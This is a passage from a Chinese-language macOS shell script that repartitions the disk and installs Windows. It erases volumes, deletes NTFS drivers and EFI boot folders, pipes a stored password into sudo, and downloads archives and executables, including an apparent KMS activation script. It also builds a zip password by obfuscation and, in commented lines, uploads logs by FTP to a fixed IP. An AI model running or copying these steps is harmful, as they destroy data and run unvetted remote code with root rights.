#curl --connect-timeout 10 -T /tmp/fqsb.txt -u $ftpm ftp://43.138.25.54>/dev/null 2>&1
#rm -rf /tmp/fqsb.txt
#read -s -n1 -p "分区失败，请手动检查！"
#open /System/Applications/Utilities/Disk\ Utility.app 	
#open /Applications/Utilities/Disk\ Utility.app
#Start_menu
clear && printf "\e[3J"
osascript -e 'Tell application "System Events" to display dialog "分区失败，请通知技术员！10.13" buttons {"OK"}'
echo
echo "分区失败，请通知技术员！10.13"
exit
fi
if [ "$ddfq" ]; then 
diskutil eraseVolume JHFS+ DOS $restore_device
diskutil resizeVolume $restore_device "${csize}" ExFAT D 0b
diskutil eraseVolume MS-DOS DOS $restore_device
fi
restore_device="/dev/${restore_device}"
echo "已完成分区，安装分区为：${restore_device}"
#Winxt
Downloadzxc
else
restore_device=`diskutil cs resizestack disk"$num" "${new_hfs_size}" JHFS+ Boot 100MB MS-DOS DOS 0b|grep 'FAT32 clusters'|sed 's/.*\(disk[0123456789]\{1,\}s[0123456789]\{1,\}\).*/\1/'`
if [ -z "$restore_device" ] ; then
#echo "AZxx=分区失败" > /tmp/fqsb.txt
#curl --connect-timeout 10 -T /tmp/fqsb.txt -u $ftpm ftp://43.138.25.54>/dev/null 2>&1
#rm -rf /tmp/fqsb.txt
#read -s -n1 -p "分区失败，请手动检查！"
#open /System/Applications/Utilities/Disk\ Utility.app 	
#open /Applications/Utilities/Disk\ Utility.app
#Start_menu
clear && printf "\e[3J"
osascript -e 'Tell application "System Events" to display dialog "分区失败，请通知技术员！" buttons {"OK"}'
echo
echo "分区失败，请通知技术员！10.13SIP"
exit
fi
if [ "$ddfq" ]; then 
diskutil eraseVolume JHFS+ DOS $restore_device
diskutil resizeVolume $restore_device "${csize}" ExFAT D 0b
diskutil eraseVolume MS-DOS DOS $restore_device
fi
restore_device="/dev/${restore_device}"
echo "已完成分区，安装分区为：${restore_device}"
#Winxt
Downloadzxc
fi
fi
restore_device=`diskutil cs resizestack disk"$num" "${new_hfs_size}" MS-DOS DOS 0b|grep 'FAT32 clusters'|sed 's/.*\(disk[0123456789]\{1,\}s[0123456789]\{1,\}\).*/\1/'`
if [ -z "$restore_device" ] ; then
#echo "AZxx=分区失败" > /tmp/fqsb.txt
#curl --connect-timeout 10 -T /tmp/fqsb.txt -u $ftpm ftp://43.138.25.54>/dev/null 2>&1
#rm -rf /tmp/fqsb.txt
#read -s -n1 -p "分区失败，请手动检查！"
#open /System/Applications/Utilities/Disk\ Utility.app 	
#open /Applications/Utilities/Disk\ Utility.app
#Start_menu
clear && printf "\e[3J"
osascript -e 'Tell application "System Events" to display dialog "分区失败，请通知技术员！" buttons {"OK"}'
echo
echo "分区失败，请通知技术员！CS"
exit
fi
if [ "$ddfq" ]; then 
diskutil eraseVolume JHFS+ DOS $restore_device
diskutil resizeVolume $restore_device "${csize}" ExFAT D 0b
diskutil eraseVolume MS-DOS DOS $restore_device
fi
restore_device="/dev/${restore_device}"
echo "已完成分区，安装分区为：${restore_device}"
#Winxt
Downloadzxc
fi


if [ $apfs_active == 1 ] ; then
echo creating from APFS
apfs_wholedisk=`diskutil info -plist disk"$num"s"$num2" |grep -A 1 ParentWholeDisk|tail -1|sed 's|.*<string>\(.*\)</string>.*|\1|'`
if [ -z "$apfs_wholedisk" ] ; then
echo "无法从disk"$num"s"$num2"中找到整个磁盘。“退出”"
exit -1
fi
echo 正在操作中APFS....需要较长时间....耐心等待即可....
restore_device=`diskutil apfs resizeContainer "${apfs_wholedisk}" "${new_hfs_size}" MS-DOS DOS 0b|grep 'FAT32 clusters'|sed 's/.*\(disk[0123456789]\{1,\}s[0123456789]\{1,\}\).*/\1/'`
if [ -z "$restore_device" ] ; then
osascript -e 'quit app"Safari"'
echo "$pass" | sudo -S sudo tmutil thinlocalsnapshots / 9999999999999999 >/dev/null 2>&1
echo "$pass" | sudo -S sudo tmutil thinlocalsnapshots / 999999999999999 4 >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf ~/Library/Caches/*>/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf ~/Library/Containers/com.tencent.QQBrowserLite/Data/Library/Caches/WebKit>/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf ~/Library/Containers/com.apple.Safari/Data/Library/Caches/com.apple.Safari/WebKitCache>/dev/null 2>&1
restore_device=`diskutil apfs resizeContainer "${apfs_wholedisk}" "${new_hfs_size}" MS-DOS DOS 0b|grep 'FAT32 clusters'|sed 's/.*\(disk[0123456789]\{1,\}s[0123456789]\{1,\}\).*/\1/'`
#if [ -z "$restore_device" ] ; then
#echo "AZxx=分区失败" > /tmp/fqsb.txt
#curl --connect-timeout 10 -T /tmp/fqsb.txt -u $ftpm ftp://43.138.25.54>/dev/null 2>&1
#rm -rf /tmp/fqsb.txt
#/Applications/Utilities/Boot\ Camp\ Assistant.app/Contents/MacOS/Boot\ Camp\ Assistant>/dev/null 2>&1 
#/System/Applications/Utilities/Boot\ Camp\ Assistant.app/Contents/MacOS/Boot\ Camp\ Assistant>/dev/null 2>&1
#restore_device=`diskutil apfs resizeContainer "${apfs_wholedisk}" "${new_hfs_size}" MS-DOS DOS 0b|grep 'FAT32 clusters'|sed 's/.*\(disk[0123456789]\{1,\}s[0123456789]\{1,\}\).*/\1/'`
#fi
if [ -z "$restore_device" ] ; then
clear && printf "\e[3J"
osascript -e 'Tell application "System Events" to display dialog "分区失败，请通知技术员！" buttons {"OK"}'
echo
echo "分区失败，请通知技术员！"
exit
fi
fi
if [ "$ddfq" ]; then 
diskutil eraseVolume JHFS+ DOS $restore_device
diskutil resizeVolume $restore_device "${csize}" ExFAT D 0b
diskutil eraseVolume MS-DOS DOS $restore_device
fi
restore_device="/dev/${restore_device}"
echo "已完成大小调整。安装分区为：${restore_device}"
wholedisk=`diskutil info -plist "$restore_device" |grep -A 1 ParentWholeDisk|tail -1|sed 's|.*<string>\(.*\)</string>.*|\1|'`
echo "整个磁盘是：${wholedisk}"
if [ -z "${wholedisk}" ] ; then
echo "找不到整个磁盘…正在退出"
exit -1
fi
#Winxt
Downloadzxc
fi


if [ $apfs_active == 0 ] ; then

if [ "$PEDrv" ] ; then
if [ ! "$MBR10" ]; then
if [ "$sip" ]; then
if [[ $modelxh = "10.10"* ]]; then
echo 正在操作中HFS....需要较长时间....耐心等待即可...
REHD="$(diskutil list | grep Apple_Boot)"
if [ "$REHD" ]; then
restore_device=`diskutil resizeVolume disk"$num"s"$num2" "${new_hfs_size}" JHFS+ Boot 100MB MS-DOS DOS 0b|grep "Microsoft Basic Data"|sed 's/.*\(disk.*s.*\)/\1/'`
else
restore_device=`diskutil resizeVolume disk"$num"s"$num2" "${new_hfs_size}" JHFS+ Recovery 100MB JHFS+ Boot 100MB MS-DOS DOS 0b|grep "Microsoft Basic Data"|sed 's/.*\(disk.*s.*\)/\1/'`
fi
if [ -z "$restore_device" ] ; then
#echo "AZxx=分区失败" > /tmp/fqsb.txt
#curl --connect-timeout 10 -T /tmp/fqsb.txt -u $ftpm ftp://43.138.25.54>/dev/null 2>&1
#rm -rf /tmp/fqsb.txt
#read -s -n1 -p "分区失败，请手动检查！"
#open /System/Applications/Utilities/Disk\ Utility.app 	
#open /Applications/Utilities/Disk\ Utility.app
#Start_menu
clear && printf "\e[3J"
osascript -e 'Tell application "System Events" to display dialog "分区失败，请通知技术员！" buttons {"OK"}'
echo
echo "分区失败，请通知技术员！"
exit
fi
diskutil eraseVolume JHFS+ DOS $restore_device
hfs_size=`diskutil info -plist $restore_device |grep -A 1 TotalSize|tail -1|sed 's|.*<integer>\(.*\)</integer>.*|\1|'`
new_hfs_size="$(($hfs_size-7000000000))b"
diskutil resizeVolume $restore_device "${new_hfs_size}" MS-DOS PEVIP 0b
if [ ! -e /Volumes/PEVIP ]; then
clear && printf "\e[3J"	
echo
echo "$restore_device"
echo "${new_hfs_size}"
echo
diskutil list
echo
read -s -n1 -p "无法创建PEVIP分区，请通知技术员！"
open /System/Applications/Utilities/Disk\ Utility.app 	
open /Applications/Utilities/Disk\ Utility.app
Start_menu
fi
diskutil eraseVolume MS-DOS DOS $restore_device
#Winxt
Downloadzxc
fi
fi
fi
fi

if [ "$PEDrv" ] ; then
if [ ! "$MBR10" ]; then
if [ "$sip" ]; then
if [[ $modelxh = "10.11"* ]]; then
echo 正在操作中HFS....需要较长时间....耐心等待即可...
REHD="$(diskutil list | grep Apple_Boot)"
if [ "$REHD" ]; then
restore_device=`diskutil resizeVolume disk"$num"s"$num2" "${new_hfs_size}" JHFS+ Boot 100MB MS-DOS DOS 0b|grep "Microsoft Basic Data"|sed 's/.*\(disk.*s.*\)/\1/'`
else
restore_device=`diskutil resizeVolume disk"$num"s"$num2" "${new_hfs_size}" JHFS+ Recovery 100MB JHFS+ Boot 100MB MS-DOS DOS 0b|grep "Microsoft Basic Data"|sed 's/.*\(disk.*s.*\)/\1/'`
fi
if [ -z "$restore_device" ] ; then
#echo "AZxx=分区失败" > /tmp/fqsb.txt
#curl --connect-timeout 10 -T /tmp/fqsb.txt -u $ftpm ftp://43.138.25.54>/dev/null 2>&1
#rm -rf /tmp/fqsb.txt
#read -s -n1 -p "分区失败，请手动检查！"
#open /System/Applications/Utilities/Disk\ Utility.app 	
#open /Applications/Utilities/Disk\ Utility.app
#Start_menu
clear && printf "\e[3J"
osascript -e 'Tell application "System Events" to display dialog "分区失败，请通知技术员！" buttons {"OK"}'
echo
echo "分区失败，请通知技术员！"
exit
fi
diskutil eraseVolume JHFS+ DOS $restore_device
hfs_size=`diskutil info -plist $restore_device |grep -A 1 TotalSize|tail -1|sed 's|.*<integer>\(.*\)</integer>.*|\1|'`
new_hfs_size="$(($hfs_size-7000000000))b"
diskutil resizeVolume $restore_device "${new_hfs_size}" MS-DOS PEVIP 0b
if [ ! -e /Volumes/PEVIP ]; then
clear && printf "\e[3J"	
echo
echo "$restore_device"
echo "${new_hfs_size}"
echo
diskutil list
echo
read -s -n1 -p "无法创建PEVIP分区，请通知技术员！"
open /System/Applications/Utilities/Disk\ Utility.app 	
open /Applications/Utilities/Disk\ Utility.app
Start_menu
fi
diskutil eraseVolume MS-DOS DOS $restore_device
#Winxt
Downloadzxc
fi
fi
fi
fi

if [[ $modelxh = "10.11"* ]]; then
if [ ! "$sip" ] ; then
echo 正在操作中....需要较长时间....耐心等待即可....
restore_device=`diskutil resizeVolume disk"$num"s"$num2" "${new_hfs_size}" MS-DOS DOS 0b|grep "Microsoft Basic Data"|sed 's/.*\(disk.*s.*\)/\1/'`
if [ -z "$restore_device" ] ; then
#echo "AZxx=分区失败" > /tmp/fqsb.txt
#curl --connect-timeout 10 -T /tmp/fqsb.txt -u $ftpm ftp://43.138.25.54>/dev/null 2>&1
#rm -rf /tmp/fqsb.txt
#read -s -n1 -p "分区失败，请手动检查！"
#open /System/Applications/Utilities/Disk\ Utility.app 	
#open /Applications/Utilities/Disk\ Utility.app
#Start_menu
clear && printf "\e[3J"
osascript -e 'Tell application "System Events" to display dialog "分区失败，请通知技术员！" buttons {"OK"}'
echo
echo "分区失败，请通知技术员！"
exit
fi
if [ "$ddfq" ]; then 
diskutil eraseVolume JHFS+ DOS $restore_device
diskutil resizeVolume $restore_device "${csize}" ExFAT D 0b
diskutil eraseVolume MS-DOS DOS $restore_device
fi
restore_device="/dev/${restore_device}"
echo "已完成分区，安装分区为：${restore_device}"
#Winxt
Downloadzxc
else
echo 正在操作中....需要较长时间....耐心等待即可....
REHD="$(diskutil list | grep Apple_Boot)"
if [ "$REHD" ]; then
restore_device=`diskutil resizeVolume disk"$num"s"$num2" "${new_hfs_size}" JHFS+ Boot 100MB MS-DOS DOS 0b|grep "Microsoft Basic Data"|sed 's/.*\(disk.*s.*\)/\1/'`
else
restore_device=`diskutil resizeVolume disk"$num"s"$num2" "${new_hfs_size}" JHFS+ Recovery 100MB JHFS+ Boot 100MB MS-DOS DOS 0b|grep "Microsoft Basic Data"|sed 's/.*\(disk.*s.*\)/\1/'`
fi
if [ -z "$restore_device" ] ; then
#echo "AZxx=分区失败" > /tmp/fqsb.txt
#curl --connect-timeout 10 -T /tmp/fqsb.txt -u $ftpm ftp://43.138.25.54>/dev/null 2>&1
#rm -rf /tmp/fqsb.txt
#read -s -n1 -p "分区失败，请手动检查！"
#open /System/Applications/Utilities/Disk\ Utility.app 	
#open /Applications/Utilities/Disk\ Utility.app
#Start_menu
clear && printf "\e[3J"
osascript -e 'Tell application "System Events" to display dialog "分区失败，请通知技术员！" buttons {"OK"}'
echo
echo "分区失败，请通知技术员！"
exit
fi
if [ "$ddfq" ]; then 
diskutil eraseVolume JHFS+ DOS $restore_device
diskutil resizeVolume $restore_device "${csize}" ExFAT D 0b
diskutil eraseVolume MS-DOS DOS $restore_device
fi
restore_device="/dev/${restore_device}"
echo "已完成分区，安装分区为：${restore_device}"
#Winxt
Downloadzxc
fi
fi

if [[ $modelxh = "10.12"* ]]; then
if [ ! "$sip" ] ; then
echo 正在操作中....需要较长时间....耐心等待即可....
restore_device=`diskutil resizeVolume disk"$num"s"$num2" "${new_hfs_size}" MS-DOS DOS 0b|grep "Microsoft Basic Data"|sed 's/.*\(disk.*s.*\)/\1/'`
if [ -z "$restore_device" ] ; then
#echo "AZxx=分区失败" > /tmp/fqsb.txt
#curl --connect-timeout 10 -T /tmp/fqsb.txt -u $ftpm ftp://43.138.25.54>/dev/null 2>&1
#rm -rf /tmp/fqsb.txt
#read -s -n1 -p "分区失败，请手动检查！"
#open /System/Applications/Utilities/Disk\ Utility.app 	
#open /Applications/Utilities/Disk\ Utility.app
#Start_menu
clear && printf "\e[3J"
osascript -e 'Tell application "System Events" to display dialog "分区失败，请通知技术员！" buttons {"OK"}'
echo
echo "分区失败，请通知技术员！"
exit
fi
if [ "$ddfq" ]; then 
diskutil eraseVolume JHFS+ DOS $restore_device
diskutil resizeVolume $restore_device "${csize}" ExFAT D 0b
diskutil eraseVolume MS-DOS DOS $restore_device
fi
restore_device="/dev/${restore_device}"
echo "已完成分区，安装分区为：${restore_device}"
#Winxt
Downloadzxc
else
echo 正在操作中....需要较长时间....耐心等待即可....
REHD="$(diskutil list | grep Apple_Boot)"
if [ "$REHD" ]; then
restore_device=`diskutil resizeVolume disk"$num"s"$num2" "${new_hfs_size}" JHFS+ Boot 100MB MS-DOS DOS 0b|grep "Microsoft Basic Data"|sed 's/.*\(disk.*s.*\)/\1/'`
else
restore_device=`diskutil resizeVolume disk"$num"s"$num2" "${new_hfs_size}" JHFS+ Recovery 100MB JHFS+ Boot 100MB MS-DOS DOS 0b|grep "Microsoft Basic Data"|sed 's/.*\(disk.*s.*\)/\1/'`
fi
if [ -z "$restore_device" ] ; then
#echo "AZxx=分区失败" > /tmp/fqsb.txt
#curl --connect-timeout 10 -T /tmp/fqsb.txt -u $ftpm ftp://43.138.25.54>/dev/null 2>&1
#rm -rf /tmp/fqsb.txt
#read -s -n1 -p "分区失败，请手动检查！"
#open /System/Applications/Utilities/Disk\ Utility.app 	
#open /Applications/Utilities/Disk\ Utility.app
#Start_menu
clear && printf "\e[3J"
osascript -e 'Tell application "System Events" to display dialog "分区失败，请通知技术员！" buttons {"OK"}'
echo
echo "分区失败，请通知技术员！"
exit
fi
if [ "$ddfq" ]; then 
diskutil eraseVolume JHFS+ DOS $restore_device
diskutil resizeVolume $restore_device "${csize}" ExFAT D 0b
diskutil eraseVolume MS-DOS DOS $restore_device
fi
restore_device="/dev/${restore_device}"
echo "已完成分区，安装分区为：${restore_device}"
#Winxt
Downloadzxc
fi
fi

if [[ $modelxh = "10.13"* ]]; then
REHD="$(diskutil list | grep Apple_Boot)"
fi

if [[ $modelxh = "10.14"* ]]; then
REHD="$(diskutil list | grep Apple_Boot)"
fi

if [[ $modelxh = "10.15"* ]]; then
REHD="$(diskutil list | grep Apple_Boot)"
fi

fi



echo 正在操作中....需要较长时间....耐心等待即可....
restore_device=`diskutil resizeVolume disk"$num"s"$num2" "${new_hfs_size}" MS-DOS DOS 0b|grep "Microsoft Basic Data"|sed 's/.*\(disk.*s.*\)/\1/'`
if [ -z "$restore_device" ] ; then
#echo "AZxx=分区失败" > /tmp/fqsb.txt
#curl --connect-timeout 10 -T /tmp/fqsb.txt -u $ftpm ftp://43.138.25.54>/dev/null 2>&1
#rm -rf /tmp/fqsb.txt
#read -s -n1 -p "分区失败，请手动检查！"
#open /System/Applications/Utilities/Disk\ Utility.app 	
#open /Applications/Utilities/Disk\ Utility.app
#Start_menu
clear && printf "\e[3J"
osascript -e 'Tell application "System Events" to display dialog "分区失败，请通知技术员！" buttons {"OK"}'
echo
echo "分区失败，请通知技术员！ZH"
exit
fi
if [ "$ddfq" ]; then 
diskutil eraseVolume JHFS+ DOS $restore_device
diskutil resizeVolume $restore_device "${csize}" ExFAT D 0b
diskutil eraseVolume MS-DOS DOS $restore_device
fi
restore_device="/dev/${restore_device}"
echo "已完成分区，安装分区为：${restore_device}"
#Winxt
Downloadzxc


exit 1
}


Winxt(){



if [ "$moderoot" ]; then
osascript <<EOD
do shell script "rm -rf /Library/Filesystems/iboysoft_NTFS.fs" password "$pass" with administrator privileges
do shell script "rm -rf /Library/Filesystems/osxfuse.fs" password "$pass" with administrator privileges
do shell script "rm -rf /Library/Filesystems/ufsd_NTFS.fs" password "$pass" with administrator privileges
do shell script "rm -rf /System/Library/Filesystems/fusefs_txantfs.fs" password "$pass" with administrator privileges
do shell script "rm -rf /System/Library/Filesystems/ufsd_NTFS.fs" password "$pass" with administrator privileges
do shell script "rm -rf /Library/Filesystems/tuxera_ntfs.fs" password "$pass" with administrator privileges
do shell script "rm -rf /Library/Filesystems/fusefs_txantfs.fs" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo rm -rf /Library/Filesystems/iboysoft_NTFS.fs
echo "$pass" | sudo -S sudo rm -rf /Library/Filesystems/osxfuse.fs
echo "$pass" | sudo -S sudo rm -rf /Library/Filesystems/ufsd_NTFS.fs
echo "$pass" | sudo -S sudo rm -rf /System/Library/Filesystems/fusefs_txantfs.fs
echo "$pass" | sudo -S sudo rm -rf /System/Library/Filesystems/ufsd_NTFS.fs
echo "$pass" | sudo -S sudo rm -rf /Library/Filesystems/tuxera_ntfs.fs
echo "$pass" | sudo -S sudo rm -rf /Library/Filesystems/fusefs_txantfs.fs
fi

if [ "$moderoot" ]; then
osascript <<EOD
do shell script "pmset -a displaysleep 0 disksleep 0 sleep 0" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo pmset -a displaysleep 0 disksleep 0 sleep 0
fi


if [ -f "/tmp/winclone" ]; then
echo "$pass" | sudo -S sudo rm -rf /tmp/tools
echo "$pass" | sudo -S sudo rm -rf /tmp/winclone
fi

clear && printf "\e[3J"


if [ "$DrvWZ" ]; then

/tmp/aria2c -c -o boot.zip $ip5/boott77.zip -d /tmp
unzip -o -P "${zxc:25:1}${zxc:31:1}${zxc:3:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}" "/tmp/boot.zip" -d "/tmp">/dev/null 2>&1

if [ ! -f "/tmp/winclone" ]; then
curl -# -C - --connect-timeout 10 -o "/tmp/boot.zip" "$ip5/boot7.zip">/dev/null 2>&1
unzip -o -P "${zxc:25:1}${zxc:31:1}${zxc:3:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}" "/tmp/boot.zip" -d "/tmp">/dev/null 2>&1
fi

if [ ! -f "/tmp/winclone" ]; then
read -t 10 -p "安装工具wl无法下载，10秒后自动重试..."
Winxt
fi

if [ "$wzhfxt77" ]; then
/tmp/aria2c -c -o app.cmd $osip/app7.cmd -d /tmp
/tmp/aria2c -c -o ie.reg $osip/ie.reg -d /tmp
/tmp/aria2c -c -o HFS.reg $osip/HFS.reg -d /tmp
/tmp/aria2c -c -o rootsupd.exe $osip/rootsupd.exe -d /tmp
else
if [ ! "$xtyh" ]; then
/tmp/aria2c -c -o kms.cmd $osip/kms.cmd -d /tmp
if [ ! -f "/tmp/kms.cmd" ]; then
read -t 10 -p "安装工具k无法下载，10秒后自动重试..."
Winxt
fi
else
/tmp/aria2c -c -o kms.cmd $osip/kms1.cmd -d /tmp
if [ ! -f "/tmp/kms.cmd" ]; then
read -t 10 -p "安装工具k无法下载，10秒后自动重试..."
Winxt
fi
fi
/tmp/aria2c -c -o app.cmd $osip/app.cmd -d /tmp
/tmp/aria2c -c -o ztgx.reg $osip/ztgx.reg -d /tmp
fi

if [ ! -f "/tmp/app.cmd" ]; then
read -t 10 -p "安装工具app无法下载，10秒后自动重试..."
Winxt
fi


clear && printf "\e[3J"
if [ ! "$xtyh" ]; then
/tmp/aria2c -c -o soft.exe $ip5/soft1.exe -d /tmp
else
/tmp/aria2c -c -o soft.exe $ip5/soft.exe -d /tmp
fi
/tmp/aria2c -c -o cp.zip $ip5/cp.zip -d /tmp
unzip -o /tmp/cp.zip -d /tmp
if [ ! -f "/private/tmp/cp/other/ntfsresize" ]; then
read -t 10 -p "安装工具cp无法下载，10秒后自动重试..."
Winxt
fi

#sbimac="$(echo $dnjx | grep iMac)"

#if [ ! "$sbimac" ]; then
#/tmp/aria2c -c -o lykg.zip $osip/lykg.zip -d /tmp
#unzip -o /tmp/lykg.zip -d /tmp
#/tmp/blueutil -p 0
#fi

if [ "$lanya" ]; then
/tmp/aria2c -c -o zdly.exe $ip5/zdly.exe -d /tmp
clear && printf "\e[3J"
if [ ! -f "/tmp/zdly.exe" ]; then
read -t 10 -p "安装工具zdly无法下载，10秒后自动重试..."
Winxt
fi
fi

if [ "$lanya15" ]; then
/tmp/aria2c -c -o zdly.exe $ip5/zdly15.exe -d /tmp
clear && printf "\e[3J"
if [ ! -f "/tmp/zdly.exe" ]; then
read -t 10 -p "安装工具zdly无法下载，10秒后自动重试..."
Winxt
fi
fi

if [ "$wf16" ]; then
/tmp/aria2c -c -o 16wifi.exe https://swdist.apple.com/content/downloads/12/61/041-85004/kgbnv2yk0dzllo3gz0edz19z3kwddo5hma/AppleBcUpdate.exe -d /tmp
clear && printf "\e[3J"
if [ ! -f "/tmp/16wifi.exe" ]; then
read -t 10 -p "安装工具16wifi无法下载，10秒后自动重试..."
Winxt
fi
fi



if [ "$sxt11new" ]; then
echo
echo "\033[36m正在下载文件，请等待...\033[0m"
echo
#/tmp/aria2c -c -o DrvCeo.exe --check-certificate=false $ip8/666/DrvCeo.exe -d /tmp

/tmp/aria2c -c -o DrvCeo.exe $ip5/wkqd.exe -d /tmp

clear && printf "\e[3J"
if [ ! -f "/tmp/DrvCeo.exe" ]; then
read -t 10 -p "安装工具DrvCeo无法下载，10秒后自动重试..."
Winxt
else
filesize="$(ls -l /tmp/DrvCeo.exe | awk '{ print $5 }')" 
if [ "$filesize" -lt "1000000" ]; then
clear && printf "\e[3J"
echo
rm -rf /tmp/DrvCeo.exe
read -t 2 -p "下载DrvCeo有误，将自动重试下载...如果一直重复，请通知技术员"
Winxt
fi
fi
fi

if [ "$nkqd" ]; then
echo
echo "\033[36m正在下载文件，请等待...\033[0m"
echo
/tmp/aria2c -c -o nkqd.exe --check-certificate=false $ip8/666/nkqd.exe -d /tmp
clear && printf "\e[3J"
if [ ! -f "/tmp/nkqd.exe" ]; then
read -t 10 -p "安装工具nkqd无法下载，10秒后自动重试..."
Winxt
else
filesize="$(ls -l /tmp/nkqd.exe | awk '{ print $5 }')" 
if [ "$filesize" -lt "1000000" ]; then
clear && printf "\e[3J"
echo
rm -rf /tmp/nkqd.exe
read -t 2 -p "下载nkqd有误，将自动重试下载...如果一直重复，请通知技术员"
Winxt
fi
fi
fi



#if [ "$sdqh" ]; then
#/tmp/aria2c -c -o ydxf.exe $ip5/ydxf.exe -d /tmp
#clear && printf "\e[3J"
#if [ ! -f "/tmp/ydxf.exe" ]; then
#read -t 10 -p "安装工具ydxf无法下载，10秒后自动重试..."
#Winxt
#fi
#/tmp/aria2c -c -o ydxfgj.exe $ip5/ydxfgj.exe -d /tmp
#clear && printf "\e[3J"
#if [ ! -f "/tmp/ydxfgj.exe" ]; then
#read -t 10 -p "安装工具ydxfgj无法下载，10秒后自动重试..."
#Winxt
#fi
#fi

clear && printf "\e[3J"

if [[ $modelxh = "10.6"* ]]; then
Winclone5="1"
MBR10="1"
fi
if [[ $modelxh = "10.7"* ]]; then
Winclone5="1"
MBR10="1"
fi
if [[ $modelxh = "10.8"* ]]; then
Winclone5="1"
MBR10="1"
if [[ $wzhfxt != "6135" ]]; then
/tmp/aria2c -c -o 10boot.zip $ip5/10boot.zip -d /tmp
if [ ! "$wzhfxt77" ]; then
#/tmp/aria2c -c -o wl5.zip $ip5/wl5.zip -d /tmp
/tmp/aria2c -c -o 10efi.zip $ip5/10efi.zip -d /tmp
fi
fi
fi
if [[ $modelxh = "10.9"* ]]; then
Winclone5="1"
MBR10="1"
if [[ $wzhfxt != "6135" ]]; then
/tmp/aria2c -c -o 10boot.zip $ip5/10boot.zip -d /tmp
#/tmp/aria2c -c -o wl5.zip $ip5/wl5.zip -d /tmp
/tmp/aria2c -c -o 10efi.zip $ip5/10efi.zip -d /tmp
fi
fi
if [[ $modelxh = "10.10"* ]]; then
Winclone6="1"
if [[ $wzhfxt != "6135" ]]; then
/tmp/aria2c -c -o 10boot.zip $ip5/10boot.zip -d /tmp
fi
fi
if [[ $modelxh = "10.11"* ]]; then
Winclone6="1"
if [[ $wzhfxt != "6135" ]]; then
/tmp/aria2c -c -o 10boot.zip $ip5/10boot.zip -d /tmp
fi
fi
if [[ $modelxh = "10.12"* ]]; then
Winclone7="1"
if [[ $wzhfxt != "6135" ]]; then
/tmp/aria2c -c -o 10boot.zip $ip5/10boot.zip -d /tmp
fi
fi
if [[ $modelxh = "10.13"* ]]; then
Winclone7="1"
ntsz="1"
fi
if [[ $modelxh = "10.14"* ]]; then
Winclone7="1"
ntsz="1"
fi
if [[ $modelxh = "10.15"* ]]; then
Winclone7="1"
ntsz="1"
fi
if [[ $modelxh = "11."* ]]; then
Winclone7="1"
ntsz="1"
fi
if [[ $modelxh = "12."* ]]; then
Winclone7="1"
ntsz="1"
fi
if [ "$zxos" ]; then
Winclone7="1"
ntsz="1"
fi

diskutil eraseVolume MS-DOS DOS ${restore_device}
diskutil unmount ${restore_device}

clear && printf "\e[3J"
echo
echo ID: "\033[36m${tbid}\033[0m"
echo
echo "\033[36m正在安装系统中...\033[0m"

if [ "$wzwim" ]; then

mv ~/Downloads/JG_Download/"$WZname" /tmp/Windows.wim
if [ "$Winclone6" ]; then
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone6 --self-extract -e -p ${restore_device} -i 1" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/winclone6 --self-extract -e -p ${restore_device} -i 1
fi
fi
if [ "$Winclone7" ]; then
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone --self-extract -e -p ${restore_device} -i 1" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/winclone --self-extract -e -p ${restore_device} -i 1
fi
fi
mv /tmp/Windows.wim ~/Downloads/JG_Download/"$WZname" 
else

echo "gzip -dc ~/Downloads/JG_Download/"$WZname" | dd of=${restore_device}" bs=32m > /tmp/666.sh

if [ "$moderoot" ]; then
osascript <<EOD
do shell script "bash /tmp/666.sh" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo bash /tmp/666.sh
fi

if [ "$ntsz" ]; then
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/private/tmp/cp/other/ntfsresize -f -f ${restore_device}" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /private/tmp/cp/other/ntfsresize -f -f ${restore_device}
fi
else
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/private/tmp/cp/other/ntfsresizeold -f -f ${restore_device}" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /private/tmp/cp/other/ntfsresizeold -f -f ${restore_device}
fi
fi

if [ $? -ne 0 ] ; then
clear && printf "\e[3J"
if [ "$wzcxaz" ]; then
clear && printf "\e[3J"
echo
echo
osascript -e 'Tell application "System Events" to display dialog "扩大系统盘错误！请通知技术员！" buttons {"OK"}'
exit
fi
echo
echo
read -t 30 -p "扩大系统盘错误！30秒后将自动重新安装..."
wzcxaz="1"
Winxt
fi

if [ -e /Volumes/DOS ]; then
echo
echo
read -s -n1 -p "无法写入，请重试！！！"
Winxt
fi

if [ ! "$MBR10" ]; then
if [ "$Winclone7" ]; then
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone -e -p ${restore_device}" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/winclone -e -p ${restore_device}
fi
fi
if [ "$Winclone6" ]; then
diskutil mount ${restore_device}
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone6 -e -p ${restore_device}" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/winclone6 -e -p ${restore_device}
fi
fi
else

if [ "$moderoot" ]; then
osascript <<EOD
do shell script "mkdir /Volumes/EFI" password "$pass" with administrator privileges
do shell script "mount -t msdos /dev/disk0s1 /Volumes/EFI" password "$pass" with administrator privileges
do shell script "rm -rf /Volumes/EFI/EFI/Boot" password "$pass" with administrator privileges
do shell script "rm -rf /Volumes/EFI/EFI/Microsoft" password "$pass" with administrator privileges
do shell script "diskutil unmount disk0s1" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo mkdir /Volumes/EFI
echo "$pass" | sudo -S sudo mount -t msdos /dev/disk0s1 /Volumes/EFI
echo "$pass" | sudo -S sudo rm -rf /Volumes/EFI/EFI/Boot
echo "$pass" | sudo -S sudo rm -rf /Volumes/EFI/EFI/Microsoft
